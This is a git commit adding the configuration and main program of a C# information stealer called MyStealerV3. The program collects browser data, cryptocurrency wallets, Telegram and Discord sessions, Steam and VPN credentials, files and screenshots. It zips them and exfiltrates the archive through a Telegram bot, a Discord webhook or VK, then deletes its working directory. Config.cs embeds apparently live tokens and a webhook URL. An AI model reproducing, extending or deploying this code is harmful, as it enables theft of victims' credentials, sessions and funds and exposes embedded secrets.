c748884efda2d03d74d9215f9696f754df04440f
WorkerWant <109881681+WorkerWant@users.noreply.github.com>
2022-10-05 23:47:39 +0300

    Add files via upload

---
+++ Config.cs
@@ -0,0 +1,68 @@
+﻿using System;
+using System.Collections.Generic;
+
+namespace MyStealerV3
+{
+    enum sendMethods
+    {
+        Telegram = 0,
+        Discord = 1,
+    }
+    enum MessageType
+    {
+        sendArchive = 0,
+        sendError = 1,
+        sendLog = 2
+    }
+    internal static class Config
+    {
+        //debug
+        public static string ERROR_MESSAGE = "";
+        public static string LOG_MESSAGE = "";
+        public static bool SendLog = false;
+
+        //file graber
+        public static string[] extensions =
+        {
+            ".txt",
+            ".jpg",
+            ".png",
+            ".docx",
+            ".zip",
+        };
+        public static int MaxFileSizeInKB = 1024;
+
+        //screenshots settings
+        public const int ScreenshotsCount = 1;
+        public const int ScreenshotInterval = 1000; // in ms
+
+        //Url search
+        public static List<string> CheckedUrls = new List<string>
+        {
+            "youtube.com",
+            "lolz.guru",
+            "paypal.com",
+            "github.com",
+            "xss.is",
+            "minergate.com",
+            "btc.com"
+        };
+
+        //result settings
+        public const string ZipPassword = "44";
+        public static string ZipExtension = "zip";
+        public static readonly string zipArchivePath = $@"{Resource.Help.Help.ExploitDir}\{Environment.MachineName} ({DateTime.Now.ToString("MM/dd/yyyy")}).{ZipExtension}";
+        public const sendMethods sendMethod = sendMethods.Telegram; // Куда кидать архив
+
+        //telegram
+        public const string TelegramToken = "5315291273:AAFiCQnpXXVeK3OzJk3qJCR7lHNfrmSH9X0";
+        public const int TelegramChatID = 1017254880;
+
+        //discord
+        public const string DiscordWebHook = "https://discord.com/api/webhooks/988762738253778964/alr_OACHYc1CuDoSeg9lHACdP9XE83JFIooms2q_n04-DKclmDJnLD06XA2F0J4HK16o";
+
+        //vkontakte
+        public const string VkApiToken = "6584392fb499dc96b0506457977787caf66b4c37852fa03d531b2539bdb98ef7a85a09a5623c85d8c804e";
+        public const int VkUserID = 395816914;
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,92 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Threading;
+
+namespace MyStealerV3
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            //if (Virtual())
+            //{
+            //    Environment.Exit(0);
+            //}
+            if (!File.Exists(Resource.Help.Help.ExploitDir))
+            {
+                try
+                {
+                    Directory.CreateDirectory(Resource.Help.Help.ExploitDir); // Создаем директорию стиллера
+                    List<Thread> threads = new List<Thread>(); // Список потоков стиллера
+
+                    threads.Add(new Thread(() => // other processes
+                    {
+                        Resource.Targets.Others.ProcessList.WriteProcesses();
+                        Resource.Targets.Others.SystemInfo.GetMain.GetSystem();
+                        Resource.Targets.Others.Position.PositionMain.WritePos();
+                        Resource.Targets.Others.Screen.Screen.GetScreenShots();
+                    }));
+                    threads.Add(new Thread(() => //file graber process
+                    {
+                        Resource.Targets.FileGraber.MainFileGraber.Start();
+                    }));
+                    threads.Add(new Thread(() => //Cryptocurrency get
+                    {
+                        Resource.Targets.Cryptocurrency.CryptoMain.GetCrypto();
+                    }));
+                    threads.Add(new Thread(() => //Software get
+                    {
+                        Resource.Targets.Software.VPN.VpnStart.Start();
+                        Resource.Targets.Software.Telegram.TelegramDesktop.GetTelegramSessions();
+                        Resource.Targets.Software.Discord.DiscordDesktop.WriteDiscord();
+                        Resource.Targets.Software.Steam.Steam.SteamGet();
+                    }));
+                    threads.Add(new Thread(() =>
+                    {
+                        Resource.Targets.Browsers.BrowserStart.Run();
+                    }));
+
+                    Resource.Help.StartThreads.Start(threads); // Запустить потоки из списка
+                    Resource.Help.CreateZip.NewZip(zipArchivePath: Config.zipArchivePath, password: Config.ZipPassword);
+                    Resource.Help.sender.Send(MessageType.sendArchive);
+                }
+                catch (Exception ex)
+                {
+                    Config.ERROR_MESSAGE += $"\n[ERROR Main]: {ex}";
+                }
+            }
+            else
+            {
+                Config.ERROR_MESSAGE += $"[STEALER]: Stealer already started!";
+            }
+            Program.Checker();
+            Program.Finish();
+        }
+        static void Checker()
+        {
+            if (Config.ERROR_MESSAGE != "")
+            {
+                Resource.Help.sender.Send(MessageType.sendError);
+            }
+            if (Config.SendLog && Config.LOG_MESSAGE != "")
+            {
+                Resource.Help.sender.Send(MessageType.sendLog);
+            }
+        }
+        static void Finish()
+        {
+            Thread.Sleep(15000);
+            Directory.Delete(Resource.Help.Help.ExploitDir + @"\", true);
+            Environment.Exit(0);
+        }
+        static bool Virtual()
+        {
+            if (!Environment.MachineName.Contains("DESKTOP"))
+            {
+                return true;
+            }
+            return false;
+        }
+    }
+}
